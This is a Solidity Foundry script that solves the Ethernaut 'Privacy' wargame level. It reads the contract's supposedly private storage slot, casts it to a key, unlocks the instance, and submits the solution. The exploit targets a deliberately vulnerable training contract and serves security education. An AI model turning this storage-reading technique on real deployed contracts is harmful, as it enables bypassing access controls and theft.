// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../utils/Ethernaut.sol";
import "./Privacy.sol";

contract PrivacySolver is Test, Ethernaut {
    function run() public {
        IS_TEST = false;
        test();
    }

    function test() public broadcasted {
        Privacy instance = Privacy(getLevelInstance(Levels.privacy));

        bytes32 key = vm.load(address(instance), bytes32(uint256(5)));
        instance.unlock(bytes16(key));

        require(validateLevelInstance(Levels.privacy, address(instance)), "no validation");

        if (!IS_TEST) submitLevelInstance(address(instance));
    }
}
